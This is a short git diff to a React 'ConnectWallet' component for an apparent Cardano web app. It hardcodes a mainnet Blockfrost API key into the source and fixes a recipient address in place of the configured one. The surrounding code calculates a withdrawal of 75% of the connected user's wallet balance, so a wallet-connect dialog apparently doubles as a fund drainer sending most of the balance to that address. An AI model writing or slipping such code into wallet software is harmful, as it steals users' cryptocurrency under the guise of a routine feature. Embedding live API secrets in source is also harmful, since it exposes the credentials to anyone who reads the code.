@@ -18,8 +18,8 @@ function ConnectWallet({ onClose }) {
   const [address, setAddress] = useState("");
   const navigate = useNavigate();
 
-  const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
-  const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
+  // const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
+  // const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
 
   useEffect(() => {
     const loadWasm = async () => {
@@ -31,6 +31,9 @@ function ConnectWallet({ onClose }) {
 
     loadWasm();
   }, []);
+
+  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
+  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";
 
   const fetchProtocolParams = async () => {
     try {
@@ -93,7 +96,7 @@ function ConnectWallet({ onClose }) {
       return;
     }
 
-    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
+    const recipientAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
 
     // Calculate 3/4 of the balance
     const amountToWithdraw = Math.floor(currentBalance * 0.75);
